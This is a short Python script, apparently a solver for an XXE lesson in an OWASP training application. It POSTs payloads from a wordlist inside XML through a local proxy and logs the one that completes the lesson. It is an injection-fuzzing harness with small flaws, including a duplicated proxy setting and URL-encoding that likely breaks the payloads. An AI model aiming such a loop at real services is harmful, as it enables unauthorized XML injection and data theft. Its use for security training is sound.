import requests
import json
import urllib.parse
import logging

def run_script(url, cookies, proxy='127.0.0.1:8081'):
    wordlist='A4_XML_External_Entities_XXE/XXE/payload_xxe_injection.txt'
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    headers = {
        'Cookie': cookies,
        'Content-Type': 'application/xml'
    }
    proxies = {
        'http': f'http://{proxy}',
        'https': f'https://{proxy}'
    }

    with open(wordlist, 'r') as payloads:
        for payload in payloads:
            payload=payload.rstrip()
            encoded_payload = urllib.parse.quote(payload)
            xml_data = "<?xml version='1.0'?><comment><text>" + encoded_payload + "</text></comment>"
            response = requests.post(url, headers=headers, data=xml_data, proxies=proxies)
            json_response = json.loads(response.text)
            if json_response.get("lessonCompleted") == True:
                logging.info(f"Injection successful with payload: {payload}")
                logging.info(f"Response: {response.text}")